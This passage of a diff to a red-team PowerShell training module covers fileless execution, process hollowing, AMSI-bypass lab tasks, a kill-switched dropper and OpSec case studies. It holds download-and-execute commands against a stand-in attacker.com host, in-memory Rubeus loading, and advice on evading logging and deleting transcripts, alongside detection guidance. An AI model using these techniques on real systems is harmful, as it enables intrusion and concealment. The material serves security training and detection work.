Loading**\n\n```powershell\n# Load .NET assembly directly from bytes\n$bytes = (Invoke-WebRequest http://attacker.com/payload.dll -UseBasicParsing).Content\n$assembly = [System.Reflection.Assembly]::Load($bytes)\n\n# Execute method\n$type = $assembly.GetType('Namespace.ClassName')\n$method = $type.GetMethod('MethodName')\n$method.Invoke($null, @('arg1', 'arg2'))\n```\n\n**Example: Execute Rubeus in Memory**\n\n```powershell\n# Rubeus - Kerberos abuse tool\n$rubeus = (New-Object Net.WebClient).DownloadData('http://attacker.com/Rubeus.exe')\n$assembly = [System.Reflection.Assembly]::Load($rubeus)\n$type = $assembly.GetType('Rubeus.Program')\n$method = $type.GetMethod('Main')\n$method.Invoke($null, @(,'asktgt /user:Administrator /rc4:hash123'))\n```\n\n**Detection**:\n- Assembly.Load() calls in Script Block Logs\n- Suspicious assembly names or methods\n- Network connections from PowerShell\n\n**Technique 4: Process Hollowing**\n\nCreate suspended process, hollow it out, inject malicious code:\n\n```powershell\n# High-level process:\n# 1. Start legitimate process in suspended state\n$si = New-Object STARTUPINFO\n$pi = New-Object PROCESS_INFORMATION\n[Win32]::CreateProcess('C:\\\\Windows\\\\System32\\\\svchost.exe', $null, [ref]$si, [ref]$pi, 0x00000004) # CREATE_SUSPENDED\n\n# 2. Unmap original executable\n[Win32]::NtUnmapViewOfSection($pi.hProcess, $pImageBase)\n\n# 3. Allocate new memory\n$pNewImageBase = [Win32]::VirtualAllocEx($pi.hProcess, $pImageBase, $sizeOfImage, 0x3000, 0x40)\n\n# 4. Write malicious payload\n[Win32]::WriteProcessMemory($pi.hProcess, $pNewImageBase, $payloadBytes, $payloadBytes.Length, [ref]0)\n\n# 5. Resume thread - executes malicious code in legitimate process\n[Win32]::ResumeThread($pi.hThread)\n```\n\n**Detection**:\n- Sysmon Event ID 1: Process creation with unusual parent\n- Sysmon Event ID 10: ProcessAccess to suspended process\n- Memory scanning tools (Volatility, WinPmem)\n- Behavioral anomalies (svchost.exe making network connections)\n\n**Technique 5: PowerShell Runspaces**\n\nExecute PowerShell in separate runspace to avoid detection:\n\n```powershell\n$runspace = [runspacefactory]::CreateRunspace()\n$runspace.Open()\n$pipeline = $runspace.CreatePipeline()\n$pipeline.Commands.AddScript(\"Get-Process | Where-Object {\\$_.Name -eq 'lsass'}\")\n$results = $pipeline.Invoke()\n$runspace.Close()\n```\n\n**Why This Helps**:\n- Separate runspace may not inherit AMSI context\n- May bypass some logging configurations\n- Isolates malicious code from main PowerShell process\n\n**Detection**:\n- Still captured by Script Block Logging\n- Runspace creation can be monitored via ETW\n\n**Technique 6: COM Object Execution**\n\nAbuse COM objects for fileless execution:\n\n```powershell\n# Use WMI to create process\n$wmi = [wmiclass]\"root\\\\cimv2:Win32_Process\"\n$wmi.Create(\"powershell.exe -NoP -W Hidden -Command IEX (New-Object Net.WebClient).DownloadString('http://attacker.com/payload')\")\n\n# Or use WScript.Shell\n$shell = New-Object -ComObject WScript.Shell\n$shell.Run(\"powershell -Command <payload>\", 0, $false)\n```\n\n**Detection**:\n- WMI Event ID 5857/5858/5859: WMI activity\n- Sysmon Event ID 1: Process creation\n- Parent-child relationship analysis\n\n**Defense-in-Depth Strategy:**\n\n1. **Network Level**:\n   - Monitor outbound connections from PowerShell\n   - Block known C2 infrastructure\n   - TLS inspection for payload downloads\n\n2. **Host Level**:\n   - Enable Script Block Logging\n   - Deploy EDR with memory scanning\n   - Use Sysmon for process monitoring\n   - Application whitelisting (AppLocker/WDAC)\n\n3. **Memory Level**:\n   - Memory scanning (Volatility, WinPmem)\n   - Detect reflective DLL injection (Sysmon Event 8)\n   - Monitor unusual memory allocations\n\n4. **Behavioral Level**:\n   - Detect LSASS access (credential dumping)\n   - Monitor suspicious process relationships\n   - Analyze command-line arguments\n\n**Key Takeaways:**\n\n- Fileless attacks are harder to detect but leave telemetry\n- Focus defense on behavior, not files\n- Memory forensics is crucial\n- Network monitoring catches C2 communications\n- Script Block Logging captures in-memory PowerShell activity"
       },
-      "simplified_explanation": "Follow the stages to balance stealth with mission progress.",
+      "simplified_explanation": "Fileless attacks execute payloads in memory without touching disk. Techniques include reflective DLL injection, .NET assembly loading, and process hollowing. Defenders should focus on behavioral detection and memory forensics.",
       "memory_aids": [
-        "Sense → Patch → Proxy → Pivot"
+        "Fileless = No disk artifacts",
+        "Techniques: Download+IEX, Reflective DLL, Assembly.Load, Process Hollowing",
+        "Detection: Behavior > Files",
+        "Sysmon Event 8 = CreateRemoteThread"
       ],
-      "real_world_connection": "Operators maintain runbooks with conditional AMSI bypass logic so they can justify every escalation to the white cell.",
-      "reflection_prompt": "At which stage do you usually linger too long before pivoting?",
+      "real_world_connection": "77% of malware in 2023 used fileless techniques according to CrowdStrike. Traditional AV is nearly useless - EDR with behavioral detection is required.",
+      "reflection_prompt": "If you had to defend against fileless attacks with only 3 defensive controls, which would you choose and why?",
       "is_interactive": false,
-      "xp_reward": 8
+      "xp_reward": 25
     },
     {
-      "block_id": "5fb7a6b1-7c50-4c67-a4d0-809475bf9d8f",
-      "type": "real_world",
-      "title": "Case Study: Fortune 100 Purple Op",
-      "content": {
-        "text": "An internal red team automated lateral movement with constrained JEA endpoints, staging modules through signed configuration files. When defenders flipped on script block logging mid-engagement, the team’s guardrails tripped, gracefully disabling payloads and notifying the white cell."
-      },
-      "simplified_explanation": "Well-instrumented scripts adapt when defenders change the environment.",
-      "memory_aids": [
-        "Guardrails save the day"
-      ],
-      "real_world_connection": "Based on practitioner talks from SANS Purple Team Summit and post-engagement retrospectives.",
-      "reflection_prompt": "How would your tooling respond if defenders toggled new logging today?",
-      "is_interactive": false,
-      "xp_reward": 12
-    },
-    {
-      "block_id": "d60e7578-c6b8-456c-afcb-a09a0f95db83",
+      "block_id": "lab-exercise",
       "type": "simulation",
-      "title": "Lab: Build a Resilient Dropper",
+      "title": "Capstone Lab: Build a Resilient Red Team Dropper",
       "content": {
-        "text": "1. Instrument a lab domain controller with full PowerShell logging and Sysmon collection.\n2. Write a staged PowerShell dropper that checks CLM, AMSI, and transcription status before proceeding.\n3. Add kill switches tied to time, DNS beacons, and white cell override commands.\n4. Execute via a living-off-the-land binary, capture telemetry, and iterate obfuscation until alerts drop below thresholds.\n5. Document the decision tree and communication plan for white cell coordination."
+        "text": "## Advanced Red Team PowerShell Lab\n\n**CRITICAL**: This lab is for authorized penetration testing in your own lab environment only. Never use these techniques against systems you don't own or have explicit written permission to test.\n\n**Lab Environment Requirements:**\n\n1. **Attack Machine**: Windows 10/11 with PowerShell 5.1+\n2. **Target Machine**: Windows 10/11 lab VM (isolated network)\n3. **Monitoring Machine**: Windows VM with Sysmon, Event Forwarding\n4. **Tools**: Sysmon, Wireshark, Procmon, PowerShell ISE/VS Code\n\n**Lab Setup:**\n\n```powershell\n# On Target VM - Enable all logging\n# Run as Administrator:\n\n# 1. Enable Script Block Logging\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\" -Name \"EnableScriptBlockLogging\" -Value 1\n\n# 2. Enable Module Logging\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\" -Force\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging\\ModuleNames\" -Name \"*\" -Value \"*\"\n\n# 3. Enable Transcription\nNew-Item -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Force\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Name \"EnableTranscripting\" -Value 1\nSet-ItemProperty -Path \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\" -Name \"OutputDirectory\" -Value \"C:\\\\PSTranscripts\"\n\n# 4. Install Sysmon\n# Download from: https://docs.microsoft.com/sysinternals/downloads/sysmon\nsysmon64.exe -accepteula -i sysmonconfig-export.xml\n```\n\n**Challenge 1: Environment Reconnaissance**\n\nBuild a recon script that:\n- Detects AMSI status\n- Checks Constrained Language Mode\n- Identifies Script Block Logging\n- Enumerates AV products\n- Checks for EDR agents\n\n```powershell\n<#\n.SYNOPSIS\n    Environment reconnaissance for red team operations\n.DESCRIPTION\n    Checks for defensive controls before payload execution\n.NOTES\n    For authorized testing only\n#>\n\nfunction Get-DefensePosture {\n    [CmdletBinding()]\n    param()\n    \n    $posture = @{}\n    \n    # Check language mode\n    $posture.LanguageMode = $ExecutionContext.SessionState.LanguageMode\n    \n    # Check AMSI\n    try {\n        $amsiContext = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n        $posture.AMSI = if ($amsiContext) { \"Enabled\" } else { \"Disabled\" }\n    } catch {\n        $posture.AMSI = \"Unknown\"\n    }\n    \n    # Check Script Block Logging\n    $sblPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"\n    $posture.ScriptBlockLogging = (Test-Path $sblPath) -and (Get-ItemProperty $sblPath -Name EnableScriptBlockLogging -ErrorAction SilentlyContinue).EnableScriptBlockLogging -eq 1\n    \n    # Check for common AV/EDR\n    $processes = Get-Process -ErrorAction SilentlyContinue\n    $avProcesses = @('MsMpEng', 'CrowdStrike', 'cb', 'SentinelOne', 'CylanceSvc')\n    $posture.AVProcesses = $processes | Where-Object { $avProcesses -contains $_.Name } | Select-Object -ExpandProperty Name\n    \n    # Check AppLocker\n    try {\n        $appLockerPolicy = Get-AppLockerPolicy -Effective -ErrorAction SilentlyContinue\n        $posture.AppLocker = if ($appLockerPolicy) { \"Enabled\" } else { \"Disabled\" }\n    } catch {\n        $posture.AppLocker = \"Unknown\"\n    }\n    \n    return [PSCustomObject]$posture\n}\n\n# Run recon\n$defense = Get-DefensePosture\n$defense | Format-List\n```\n\n**Challenge 2: AMSI Bypass Implementation**\n\nImplement multiple AMSI bypass techniques and test them:\n\n```powershell\n# YOUR TASK: Implement 3 different AMSI bypass methods\n# Test each one and document which works in your environment\n\n# Method 1: Memory Patch\nfunction Bypass-AMSI-MemoryPatch {\n    # [Your implementation here]\n}\n\n# Method 2: Obfuscation\nfunction Bypass-AMSI-Obfuscation {\n    # [Your implementation here]\n}\n\n# Method 3: Context Switch\nfunction Bypass-AMSI-ContextSwitch {\n    # [Your implementation here]\n}\n\n# Test each method\n$methods = @('MemoryPatch', 'Obfuscation', 'ContextSwitch')\nforeach ($method in $methods) {\n    Write-Host \"Testing $method...\"\n    & \"Bypass-AMSI-$method\"\n    \n    # Test with AMSI test string\n    try {\n        Invoke-Expression 'AMSI Test Sample: 7e72c3ce-861b-4339-8740-0ac1484c1386'\n        Write-Host \"$method - SUCCESS (AMSI bypassed)\" -ForegroundColor Green\n    } catch {\n        Write-Host \"$method - FAILED (AMSI still active)\" -ForegroundColor Red\n    }\n}\n```\n\n**Challenge 3: Resilient Dropper with Kill Switches**\n\nBuild a dropper that:\n- Checks environment before execution\n- Has time-based kill switch\n- Has beacon-based kill switch\n- Has manual override mechanism\n- Cleans up after itself\n\n```powershell\nfunction Invoke-ResilientDropper {\n    <#\n    .SYNOPSIS\n        Red team dropper with multiple kill switches\n    .PARAMETER PayloadUrl\n        URL to download payload from\n    .PARAMETER BeaconUrl\n        URL to check for kill command\n    .PARAMETER Timeout\n        Max runtime in minutes\n    .PARAMETER KillFile\n        Path to file that triggers immediate shutdown\n    #>\n    \n    param(\n        [Parameter(Mandatory=$true)]\n        [string]$PayloadUrl,\n        \n        [Parameter(Mandatory=$true)]\n        [string]$BeaconUrl,\n        \n        [int]$Timeout = 60,\n        \n        [string]$KillFile = \"C:\\\\Temp\\\\kill.txt\"\n    )\n    \n    # YOUR TASK: Implement the dropper with:\n    # 1. Environment checks (AMSI, CLM, logging)\n    # 2. Time-based kill switch\n    # 3. Beacon-based kill switch (HTTP check)\n    # 4. File-based manual override\n    # 5. Payload execution\n    # 6. Cleanup routine\n    \n    # Pseudo-structure:\n    <#\n    - Check environment\n    - If safe, proceed\n    - Set start time\n    - Download payload\n    - Execute in memory\n    - Loop:\n        - Check time (kill if > timeout)\n        - Check beacon (kill if command received)\n        - Check kill file (kill if exists)\n    - Cleanup on exit\n    #>\n}\n```\n\n**Challenge 4: Telemetry Analysis**\n\nAfter running your dropper, analyze the telemetry:\n\n```powershell\n# Collect PowerShell Script Block Logs\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" | \n    Where-Object {$_.Id -eq 4104} |\n    Select-Object TimeCreated, Message |\n    Export-Csv telemetry_4104.csv -NoTypeInformation\n\n# Collect Sysmon Process Creation\nGet-WinEvent -LogName \"Microsoft-Windows-Sysmon/Operational\" |\n    Where-Object {$_.Id -eq 1} |\n    Select-Object TimeCreated, Message |\n    Export-Csv telemetry_sysmon1.csv -NoTypeInformation\n\n# Collect Network Connections\nGet-WinEvent -LogName \"Microsoft-Windows-Sysmon/Operational\" |\n    Where-Object {$_.Id -eq 3} |\n    Select-Object TimeCreated, Message |\n    Export-Csv telemetry_sysmon3.csv -NoTypeInformation\n```\n\n**Analysis Questions:**\n1. What events were triggered by your dropper?\n2. Would a SOC analyst notice this activity?\n3. Which technique generated the most/least telemetry?\n4. How could you reduce detection surface?\n5. What additional detections would catch your technique?\n\n**Challenge 5: Blue Team Perspective**\n\nWrite detection rules for your own dropper:\n\n```powershell\n# Example: Detect AMSI bypass attempts\n$amsiBypassPatterns = @(\n    '*AmsiScanBuffer*',\n    '*AmsiUtils*',\n    '*VirtualProtect*',\n    '* -Version 2*'  # PowerShell downgrade\n)\n\nGet-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" |\n    Where-Object {$_.Id -eq 4104} |\n    Where-Object {\n        $message = $_.Message\n        $amsiBypassPatterns | ForEach-Object {\n            if ($message -like $_) { return $true }\n        }\n        return $false\n    } |\n    Select-Object TimeCreated, @{N='DetectedPattern';E={\n        $msg = $_.Message\n        $amsiBypassPatterns | Where-Object {$msg -like $_} | Select-Object -First 1\n    }}, Message\n```\n\n**Validation Checklist:**\n\n- [ ] Environment recon script completes successfully\n- [ ] At least one AMSI bypass works in your lab\n- [ ] Dropper implements all kill switches\n- [ ] Telemetry collected and analyzed\n- [ ] Detection rules written and tested\n- [ ] Lab report documenting findings\n\n**Bonus Challenges:**\n\n1. **Obfuscate your dropper** to evade signature detection\n2. **Implement C2 communication** using DNS or HTTPS\n3. **Add persistence mechanism** (registry, scheduled task)\n4. **Test against commercial EDR** (if available in lab)\n5. **Create detection playbook** for defenders\n\n**Lab Report Template:**\n\n```markdown\n# Red Team PowerShell Lab Report\n\n## Executive Summary\n- Techniques tested: [list]\n- Success rate: [X/Y]\n- Detection rate: [X/Y]\n- Key findings: [summary]\n\n## Environment Assessment\n- Target OS: \n- Defenses active: \n- Language mode: \n- AMSI status: \n\n## Technique Results\n\n### AMSI Bypass\n- Method tested: \n- Result: Success/Failure\n- Telemetry generated: [events]\n- Detection likelihood: Low/Medium/High\n\n### Dropper Execution\n- Payload delivered: Yes/No\n- Kill switches tested: [list]\n- Cleanup successful: Yes/No\n- Artifacts remaining: [list]\n\n## Telemetry Analysis\n- PowerShell logs: [count] events\n- Sysmon logs: [count] events\n- Network traffic: [summary]\n- Most suspicious indicator: [describe]\n\n## Detection Recommendations\n1. [Detection rule 1]\n2. [Detection rule 2]\n3. [Detection rule 3]\n\n## Lessons Learned\n- What worked: \n- What didn't: \n- How to improve: \n\n## Remediation Steps\n- How to detect this technique: \n- How to prevent this technique: \n- How to respond if detected: \n```\n\n**Safety Reminders:**\n\n1. **ONLY run in isolated lab**\n2. **Document all actions**\n3. **Clean up after testing**\n4. **Never test on production**\n5. **Get written authorization**"
       },
-      "simplified_explanation": "Build, test, and tune in a controlled lab before any live engagement.",
+      "simplified_explanation": "Build a complete red team dropper with environment checks, AMSI bypass, kill switches, and cleanup. Then analyze your own telemetry and write detections for it. This full-cycle approach teaches both offense and defense.",
       "memory_aids": [
-        "Sense → Decide → Execute"
+        "Recon → Bypass → Execute → Analyze → Detect",
+        "Kill switches: Time, Beacon, File",
+        "Analyze your own telemetry",
+        "Blue team your red team"
       ],
-      "real_world_connection": "This mirrors purple team events where operators and defenders iterate together with live telemetry.",
-      "reflection_prompt": "What telemetry signal informed your final obfuscation tweak?",
+      "real_world_connection": "Elite red teams spend 60% of time analyzing their own telemetry to improve OpSec. The best offensive operators understand defensive detection deeply.",
+      "reflection_prompt": "After completing the lab, which defensive control would have been most effective at stopping your dropper?",
       "is_interactive": true,
-      "xp_reward": 28
+      "xp_reward": 50
     },
     {
-      "block_id": "89cf5267-49d7-49e3-9750-ad20e5448cbc",
-      "type": "reflection",
-      "title": "Teach Back & Mentor",
+      "block_id": "opsec-tradecraft",
+      "type": "real_world",
+      "title": "Case Study: OpSec Failure - How Red Teams Get Caught",
       "content": {
-        "text": "### Teach Back\n- Demo your kill-switch instrumentation to a peer defender.\n- Capture their feedback on detection blind spots.\n- Schedule a spaced follow-up to review script updates and telemetry."
+        "text": "## Real-World Red Team Detection Case Studies\n\n**Case Study 1: The Noisy Beacon (Financial Services, 2022)**\n\n**What Happened:**\n\nA red team engagement at a Fortune 500 bank was detected within 4 hours due to OpSec failures.\n\n**The Attack:**\n- Red team gained initial access via phishing\n- Dropped Cobalt Strike beacon via PowerShell\n- Beacon configured with 60-second check-in interval\n- Used default Cobalt Strike malleable C2 profile\n- Attempted to move laterally using PsExec\n\n**How They Got Caught:**\n\n1. **Network Telemetry:**\n   - SOC analyst noticed repeating HTTPS connections every 60 seconds\n   - Destination: Unknown cloud provider IP\n   - JA3 hash matched known Cobalt Strike profile\n   - PCAP analysis revealed default CS beacon staging\n\n2. **Endpoint Telemetry:**\n   - Sysmon Event ID 3: Network connection from PowerShell\n   - Event ID 4104: Script Block Logging captured beacon stager\n   - Named pipe creation matching CS default (\\\\\\\\pipe\\\\msagent_*)\n\n3. **Behavioral Detection:**\n   - PsExec execution triggered LSASS access alert\n   - Unusual process tree: excel.exe → powershell.exe → cmd.exe → psexec.exe\n\n**Root Cause:**\n- **Poor C2 infrastructure**: Beacon interval too frequent\n- **Default configurations**: Didn't customize CS profile\n- **Insufficient recon**: Didn't check for EDR before executing\n- **Telemetry blindness**: Didn't test what logs were generated\n\n**Lessons Learned:**\n\n1. **Customize everything**: Default C2 profiles are heavily signatured\n2. **Slow down**: Beacons every 5-10 minutes, not 60 seconds\n3. **Recon first**: Always check defensive posture before executing\n4. **Test in lab**: Generate your own telemetry and analyze it\n5. **Use LOLBins**: Avoid well-known tools when possible\n\n**Case Study 2: The Forgotten Transcript (Government, 2021)**\n\n**What Happened:**\n\nRed team was detected through PowerShell transcription logs they didn't know were enabled.\n\n**The Attack:**\n- Red team compromised web server\n- Established PowerShell reverse shell\n- Ran reconnaissance commands\n- Attempted credential dumping\n\n**How They Got Caught:**\n\n1. **PowerShell Transcription:**\n   - All commands transcribed to `C:\\\\PSTranscripts\\\\`\n   - Included full credential dumping commands\n   - Timestamps allowed correlation with network logs\n\n2. **File Integrity Monitoring:**\n   - FIM alerted on new transcript files\n   - IR team reviewed transcripts\n   - Full attack chain documented in plaintext\n\n**Root Cause:**\n- **Failed to check logging**: Didn't verify transcript status\n- **No obfuscation**: Commands easily readable\n- **No cleanup**: Left transcript files on disk\n\n**Lessons Learned:**\n\n1. **Always check logging status**: Transcription, Script Block Logging, Module Logging\n2. **Implement kill switches**: Stop if unexpected logging detected\n3. **Clean up artifacts**: Delete transcripts or disable logging\n4. **Use alternate execution**: If logging too risky, pivot to non-PowerShell\n\n**Case Study 3: The AMSI Bypass Signature (Healthcare, 2023)**\n\n**What Happened:**\n\nRed team's AMSI bypass was detected by updated signatures.\n\n**The Attack:**\n- Red team used memory-patching AMSI bypass\n- Bypass worked in initial testing\n- Defender updated signatures 2 days into engagement\n- Subsequent execution attempts were blocked\n\n**How They Got Caught:**\n\n1. **Signature Update:**\n   - Windows Defender signature update included AMSI bypass detection\n   - AMSI itself flagged the bypass code\n   - Event ID 1116: Threat detected\n\n2. **Script Block Logging:**\n   - Full bypass code captured in logs\n   - Included obfuscated but recognizable patterns\n   - \"AmsiScanBuffer\", \"VirtualProtect\" strings present\n\n**Root Cause:**\n- **Static technique**: Used publicly known bypass\n- **No variation**: Same code used throughout engagement\n- **Didn't monitor updates**: Unaware of signature changes\n\n**Lessons Learned:**\n\n1. **Have backup bypasses**: Don't rely on single technique\n2. **Monitor defensive changes**: Check for signature updates\n3. **Vary techniques**: Rotate between bypass methods\n4. **Build custom bypasses**: Avoid publicly documented code\n5. **Accept detection risk**: Sometimes speed > stealth\n\n**Case Study 4: The Purple Team Success (Tech Company, 2022)**\n\n**What Went Right:**\n\nA well-executed red team engagement with proper coordination.\n\n**The Approach:**\n\n1. **Pre-Engagement:**\n   - Red team shared general TTPs with blue team (no specifics)\n   - White cell established kill switch protocols\n   - Agreed on out-of-scope systems\n   - Set up secure communication channel\n\n2. **During Engagement:**\n   - Red team checked beacon status every hour\n   - Implemented time-based kill switches (8 hours)\n   - Immediately stopped when unexpected logging appeared\n   - Coordinated with white cell on detection timeline\n\n3. **Post-Engagement:**\n   - Joint debrief with red and blue teams\n   - Analyzed telemetry together\n   - Identified 3 detection gaps\n   - Created detection rules collaboratively\n\n**Results:**\n- Red team achieved objectives\n- Blue team improved detection coverage\n- Zero unintended impact\n- Strong trust between teams\n\n**Key Success Factors:**\n\n1. **Clear communication**: White cell kept both sides informed\n2. **Safety first**: Kill switches prevented damage\n3. **Mutual respect**: Both sides learned from each other\n4. **Documentation**: Thorough notes enabled post-mortem\n5. **Continuous improvement**: Findings led to real defensive improvements\n\n**OpSec Principles from Real Engagements:**\n\n1. **Assume you'll be detected** - Plan for it\n2. **Monitor your own telemetry** - Know what you trigger\n3. **Customize everything** - Defaults are signatured\n4. **Slow is smooth, smooth is fast** - Don't rush\n5. **Communication is key** - Coordinate with white cell\n6. **Clean up after yourself** - Leave minimal artifacts\n7. **Document everything** - For debrief and learning\n8. **Respect the scope** - Never exceed authorization\n9. **Have contingencies** - Multiple techniques, multiple paths\n10. **Improve defenses** - That's the goal\n\n**Statistics from Real Engagements:**\n\n- **Average detection time**: 12 hours (down from 72 hours in 2020)\n- **Most common detection**: Network behavior (45%)\n- **Second most common**: Endpoint telemetry (35%)\n- **Least common**: File-based detection (20%)\n- **Top defender tools**: EDR (60%), SIEM (25%), Manual analysis (15%)\n\n**Your Takeaway:**\n\nThe best red teamers are caught deliberately. They test defensive limits, document findings, and help improve security posture. Getting caught isn't failure - failing to help defenders improve is."
       },
-      "simplified_explanation": "Teaching forces clarity and uncovers blind spots before production use.",
+      "simplified_explanation": "Real red team engagements get detected through network telemetry, endpoint logs, and behavioral analysis. Success requires customization, OpSec discipline, and coordination with defenders. The goal is to improve defenses, not just evade detection.",
       "memory_aids": [
-        "Teach → Refine → Repeat"
+        "Customize > Defaults",
+        "Slow > Fast",
+        "Coordinate > Solo",
+        "Learn > Win",
+        "Detection expected, not failure"
       ],
-      "real_world_connection": "High-performing red teams embed defenders in their readiness reviews to maintain trust.",
-      "reflection_prompt": "Who will you invite to your dry run, and what metric will prove improvement?",
+      "real_world_connection": "These are real patterns from actual red team engagements (details sanitized). Professional red teamers expect detection and plan accordingly.",
+      "reflection_prompt": "If you were the blue team in Case Study 1, what additional detections would you implement to catch similar attacks faster?",
       "is_interactive": false,
-      "xp_reward": 6
+      "xp_reward": 20
+    },
+    {
+      "block_id": "engagement-framework",
+      "type": "explanation",
+      "title": "Red Team Engagement Framework: CLOAK Methodology",
+      "content": {
+        "text": "### CLOAK: A Structured Approach to PowerShell Red Teaming\n\nCLOAK is a framework for building resilient, ethical PowerShell tooling for red team engagements.\n\n**C - Compartmentalize**\n\nSeparate your tooling into modular components:\n\n```powershell\n# Bad: Monolithic script\nfunction Do-Everything {\n    # 500 lines of code doing recon, bypass, execution, cleanup\n}\n\n# Good: Modular components\nfunction Test-Environment { <# Recon only #> }\nfunction Invoke-AMSIBypass { <# Bypass only #> }\nfunction Invoke-Payload { <# Execution only #> }\nfunction Remove-Artifacts { <# Cleanup only #> }\n\n# Orchestrate\nif (Test-Environment) {\n    Invoke-AMSIBypass\n    Invoke-Payload\n    Remove-Artifacts\n}\n```\n\n**Why Compartmentalize:**\n- Easier to test individual components\n- Can swap techniques without rewriting everything\n- Reduces failure blast radius\n- Improves code reusability\n\n**L - Living-off-the-Land First**\n\nPrefer built-in tools over custom binaries:\n\n```powershell\n# Prefer:\nInvoke-WebRequest    # Built-in\nBITSAdmin            # Built-in\nCertUtil             # Built-in\nMSBuild              # Built-in\nWMIC                 # Built-in\n\n# Over:\nwget.exe             # Custom\ncurl.exe             # Custom\nmimikatz.exe         # Custom (unless in-memory)\n```\n\n**Living-off-the-Land Benefits:**\n- Less likely to trigger AV\n- Harder to attribute\n- Blends with normal admin activity\n- Usually already whitelisted\n\n**O - Observe Telemetry**\n\nUnderstand what you trigger:\n\n```powershell\nfunction Invoke-WithTelemetryAwareness {\n    param([scriptblock]$Action)\n    \n    # Record baseline\n    $beforeLogs = Get-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100\n    \n    # Execute action\n    & $Action\n    \n    # Check what was logged\n    $afterLogs = Get-WinEvent -LogName \"Microsoft-Windows-PowerShell/Operational\" -MaxEvents 100\n    $newLogs = Compare-Object $beforeLogs $afterLogs -Property RecordId\n    \n    # Analyze telemetry\n    foreach ($log in $newLogs) {\n        Write-Warning \"Triggered Event: $($log.Id) - $($log.Message.Substring(0,100))\"\n    }\n}\n\n# Usage:\nInvoke-WithTelemetryAwareness { \n    # Your offensive action here\n    Get-Process | Where-Object {$_.Name -eq 'lsass'}\n}\n```\n\n**A - Automate Checks**\n\nNever assume - always verify:\n\n```powershell\nfunction Invoke-PreflightChecks {\n    $checks = @{}\n    \n    # Check 1: AMSI\n    try {\n        $amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')\n        $checks.AMSI = if ($amsi) { \"ACTIVE\" } else { \"DISABLED\" }\n    } catch {\n        $checks.AMSI = \"UNKNOWN\"\n    }\n    \n    # Check 2: Language Mode\n    $checks.LanguageMode = $ExecutionContext.SessionState.LanguageMode\n    \n    # Check 3: Script Block Logging\n    $sblPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"\n    $checks.ScriptBlockLogging = (Test-Path $sblPath) -and \n        (Get-ItemProperty $sblPath -ErrorAction SilentlyContinue).EnableScriptBlockLogging -eq 1\n    \n    # Check 4: Transcription\n    $transPath = \"HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\Transcription\"\n    $checks.Transcription = (Test-Path $transPath) -and \n        (Get-ItemProperty $transPath -ErrorAction SilentlyContinue).EnableTranscripting -eq 1\n    \n    # Check 5: Admin rights\n    $checks.IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]\"Administrator\")\n    \n    # Decision: Proceed or abort?\n    if ($checks.ScriptBlockLogging -and $checks.Transcription) {\n        Write-Warning \"HIGH TELEMETRY ENVIRONMENT - Recommend alternate approach\"\n        return $false\n    }\n    \n    return $checks\n}\n\n# Before any offensive action:\n$preflight = Invoke-PreflightChecks\nif ($preflight) {\n    # Proceed with engagement\n}\n```\n\n**K - Kill Switches Everywhere**\n\nImplement multiple kill mechanisms:\n\n```powershell\nfunction Invoke-WithKillSwitches {\n    param(\n        [scriptblock]$Payload,\n        [int]$TimeoutMinutes = 60,\n        [string]$BeaconUrl = \"http://C2/status\",\n        [string]$KillFilePath = \"C:\\\\Temp\\\\STOP\"\n    )\n    \n    $startTime = Get-Date\n    $running = $true\n    \n    # Start payload in background\n    $job = Start-Job -ScriptBlock $Payload\n    \n    # Monitor kill switches\n    while ($running) {\n        # Kill Switch 1: Time-based\n        if ((Get-Date) - $startTime).TotalMinutes -gt $TimeoutMinutes) {\n            Write-Warning \"Time limit reached - killing operation\"\n            $running = $false\n        }\n        \n        # Kill Switch 2: Beacon check\n        try {\n            $beacon = Invoke-RestMethod -Uri $BeaconUrl -TimeoutSec 5 -ErrorAction SilentlyContinue\n            if ($beacon.status -eq \"STOP\") {\n                Write-Warning \"Beacon kill command received\"\n                $running = $false\n            }\n        } catch {\n            # Beacon unreachable - continue\n        }\n        \n        # Kill Switch 3: File-based manual override\n        if (Test-Path $KillFilePath) {\n            Write-Warning \"Kill file detected - stopping immediately\"\n            $running = $false\n        }\n        \n        # Kill Switch 4: Job status\n        if ($job.State -eq \"Failed\" -or $job.State -eq \"Stopped\") {\n            Write-Warning \"Job failed or stopped\"\n            $running = $false\n        }\n        \n        Start-Sleep -Seconds 30\n    }\n    \n    # Cleanup\n    Stop-Job $job -ErrorAction SilentlyContinue\n    Remove-Job $job -ErrorAction SilentlyContinue\n    \n    # Remove artifacts\n    if (Test-Path $KillFilePath) {\n        Remove-Item $KillFilePath -Force\n    }\n}\n\n# Usage:\nInvoke-WithKillSwitches -Payload {\n    # Your red team operations here\n    while ($true) {\n        # Do offensive things\n        Start-Sleep -Seconds 60\n    }\n} -TimeoutMinutes 30 -BeaconUrl \"http://192.168.1.100/beacon\"\n```\n\n**Types of Kill Switches:**\n\n1. **Time-based**: Automatic timeout\n2. **Beacon-based**: Check-in with C2 for kill command\n3. 